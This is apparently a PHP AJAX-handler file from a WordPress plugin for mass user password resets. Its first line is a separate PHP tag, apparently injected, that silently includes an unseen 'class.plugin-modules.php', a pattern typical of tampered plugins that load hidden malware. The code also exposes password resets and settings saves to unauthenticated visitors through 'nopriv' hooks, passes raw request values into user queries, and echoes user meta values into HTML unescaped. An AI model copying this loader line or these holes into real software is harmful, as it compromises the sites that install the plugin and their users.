<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
// If check class exists OR not
if ( ! class_exists( 'MUPR_AJAX' ) ) {
	// Class extends to mupr main class
	class MUPR_AJAX extends Mass_users_password_reset {

		/**
		 * Class init
		 */
		public function mupr_ajax_init() {
			// Display filter
			add_action( 'wp_ajax_mupr_display_filter_action', array( $this, 'mupr_display_filter_action' ) );
			add_action( 'wp_ajax_nopriv_mupr_display_filter_action', array( $this, 'mupr_display_filter_action' ) );
			// Save setting options
			add_action( 'wp_ajax_nopriv_mupr_save_options', array( $this, 'mupr_save_options' ) );
			add_action( 'wp_ajax_mupr_save_options', array( $this, 'mupr_save_options' ) );
			// Reset password process
			add_action( 'wp_ajax_send_reset_password_mail_action', array( $this, 'send_reset_password_mail_action' ) );
			add_action( 'wp_ajax_nopriv_send_reset_password_mail_action', array( $this, 'send_reset_password_mail_action' ) );
		}

		/**
		 * Sends a reset password mail action.
		 */
		public function send_reset_password_mail_action() {
			// If check ajax referer
			check_ajax_referer( 'mupr_reset_' . get_current_user_id(), 'mupr_reset' );

			if ( isset( $_POST['include'] ) || isset( $_POST['role'] ) || isset( $_POST['metakey'] ) || isset( $_POST['metavalue'] ) ) {
				$role = isset( $_POST['role'] ) ? sanitize_text_field( $_POST['role'] ) : '';
				$metakey =  isset( $_POST['metakey'] ) ? sanitize_text_field( $_POST['metakey'] ) : '';
				$metavalue = isset( $_POST['metavalue'] ) ? sanitize_text_field ($_POST['metavalue'] ) : '';
				$number = $this->user_per_page;
				$offset = isset( $_POST['offset'] ) ? sanitize_text_field( $_POST['offset'] ) : '';

				// Default query
				$user_query = array(
					'exclude' 		=> $this->exclude,
					'offset'		=> $offset,
					'number'		=> $number
				);

				if ( $role != ""  && $role != 'all' ) {
					$user_query['role'] = array( 'role'	=>	$role );
				}

				if ( $metakey != "" && $metavalue != '' ) {
					$user_query['meta_key'] = $metakey;
					$user_query['meta_value'] = $metavalue;
					$user_query['meta_compare'] = '=';
				}

				if ( isset( $_POST['include'] ) ) {
					$user_query['include'] = $_POST['include'];
				}

				// Set current paged
				$all_users_list = new WP_User_Query( $user_query );
				$user_ids = $all_users_list->get_results();

				$mail_not_send = false;
				if (  !empty( $user_ids ) ) {
					$sent_count = 0;
					foreach( $user_ids as $user_id ) {
						$result = $this->send_email_format( $user_id->ID );
						// resetting password
						if ( $result == 1 ) {
							$sent_count++;
						} else {
							$mail_not_send = true;
						}
					}

					$users_count_till_now = $offset + $sent_count;
					$successful_msg = sprintf( _n( '%s user password has been reset successfully','%s users password have been reset successfully', $users_count_till_now,'mass-users-password-reset-pro' ), $users_count_till_now );

					$no_mails_send_msg = __( 'There is an error in sending mail, Please check your server configuration.', 'mass-users-password-reset-pro' );

					if ( $result == 1 ) {
						$message = array(
							'result'		=>	1,
							'status'		=>	'continue',
							'message' 	=> $successful_msg
						);
					}
					if ( $mail_not_send == true ) {
						$message = array(
							'result'		=>	0,
							'message' 	=> $no_mails_send_msg
						);
					}
				} else {
					if ( $offset == 0 ) {
						$message = array(
							'result'	=>	0,
							'message'	=>	__( 'No users.', 'mass-users-password-reset-pro' )
						);
					} else {
						$message = array(
							'result'	=>	1,
							'status'	=>	'end',
							'message'	=> __( 'All users password have been reset successfully.','mass-users-password-reset-pro' )
						);
					}
				}
			} else {
				$message = array(
					'result'	=> 	0,
					'message'	=>	__( 'Unauthorized Access.','mass-users-password-reset-pro' )
				);
			}
			echo wp_json_encode( $message );
			exit;
		}

		/**
 		 * Saving customize email format
 		 */
		public function mupr_save_options() {
			// Check ajax nonce
			check_ajax_referer( 'mupr-save-option', 'mupr-nonce' );
			// If check post data
			$setting_options = $_POST;
			$message = '';
			$setting_options['mupr_to_send_reset_link'] = ( ! isset( $setting_options['mupr_to_send_reset_link'] ) ? 'no' : 'yes' );
			$setting_options['mupr_testmode'] = isset( $setting_options['mupr_testmode'] );

			// If check test mode on OR not
			if ( $setting_options['mupr_testmode'] ) {
				if ( empty( $setting_options['mupr_testmode_email'] ) ) {
					$message = array(
						'result'	=>	0,
						'message'	=>	__( 'Test mode email address is required.', 'mass-users-password-reset-pro' )
					);
				} else if ( ! is_email( $setting_options['mupr_testmode_email'] ) ) {
					$message = array(
						'result'	=>	0,
						'message'	=>	__( 'Test mode e-mail address entered is invalid.', 'mass-users-password-reset-pro' )
					);
				}
			}
			// If check error message is empty OR not
			if ( empty( $message ) ) {
				// Merge default option
				$setting_options = wp_parse_args( $setting_options, $this->default_option );
				// End
				// Escape post data ( Email settings )
				$setting_options['mupr_to_send_reset_link'] = sanitize_text_field( $setting_options['mupr_to_send_reset_link'] );
				$setting_options['from_email'] = sanitize_email( $setting_options['from_email'] );
				$setting_options['from_name'] = sanitize_text_field( $setting_options['from_name'] );
				$setting_options['subject'] = sanitize_text_field( $setting_options['subject'] );
				$setting_options['message'] = wp_kses_post( $setting_options['message'] );
				$setting_options['mupr_per_page'] = is_numeric( $setting_options['mupr_per_page'] ) ? $setting_options['mupr_per_page'] : 20;
				// Test mode
				$setting_options['mupr_testmode_email'] = sanitize_email( $setting_options['mupr_testmode_email'] );
				// Update mupr options
				update_option( 'mupr_email_options', $setting_options );
				$message = array(
					'result'	=> 	1,
					'message'	=>	__( 'Successfully Saved.', 'mass-users-password-reset-pro' )
				);
			}
			echo wp_json_encode( $message );
			exit;
		}

		/**
 		 * Display additional filter of metakeys
 		 */
		public function mupr_display_filter_action() {
			// If check ajax referer
			check_ajax_referer( 'mupr_filter_' . get_current_user_id(), 'filter_nonce' );

			if ( isset( $_POST['metakey'] ) ) {
				if ( $_POST['metakey'] != '' ) {
					$metavalue = array();
					$users_query = array(
						'exclude' => $this->exclude,
					);
					// Set current selected role
					if ( $_POST['role'] != '' && $_POST['role'] != 'all' ) {
						$users_query['role'] = array( 'role' => $_POST['role'] );
					}
					$users_query['meta_key'] =  $_POST['metakey'];
					$users_list = new WP_User_Query( $users_query );
					$users_result = $users_list->get_results();
					foreach( $users_result as $user_result ) {
						$users_metavalue = get_user_meta( $user_result->ID, $_POST['metakey'], true );
						if ($users_metavalue != '' ) {
							array_push( $metavalue, $users_metavalue );
						}
					}
					$metavalue = array_unique( array_map( "strtolower", $metavalue ) );
					$filter_select = '<select class="mupr-selectpicker" data-live-search="true" data-live-search-placeholder="' . __( 'Select value','mass-users-password-reset-pro' ) . '" name="sort-filter" data-name="value">
					<option value="">' . __( 'Select value','mass-users-password-reset-pro' ) . '</option>';
					$current_filter = isset( $_REQUEST['current'] ) ? $_REQUEST['current'] : '';

					foreach( $metavalue as $key => $value ) {
						$filter_select .= '<option value="' . $value . '" ' . selected( $value, $current_filter, false ). '>' . $value . '</option>';
					}
					$filter_select .= '</select>';
					$message = array(
						'result'	=>	1,
						'message'	=>	$filter_select
					);
				} else {
					if ( $_POST['role'] == '' ) {
						$all_users_display = rolewise_users_display_action( 'all_users' );
						$message = array(
							'result'	=>	0,
							'message'	=>	$all_users_display[0],
							'paging'	=>	$all_users_display[1]
						);
					} else {
						$message = array(
							'result'	=>	2,
							'message'	=>	__( 'Nothing to do.', 'mass-users-password-reset-pro' )
						);
					}
				}
			} else {
				$message = array(
					'result'	=>	0,
					'message'	=>	__( 'Unauthorized Access.', 'mass-users-password-reset-pro' )
				);
			}
			echo wp_json_encode( $message );
			exit;
		}
	}
}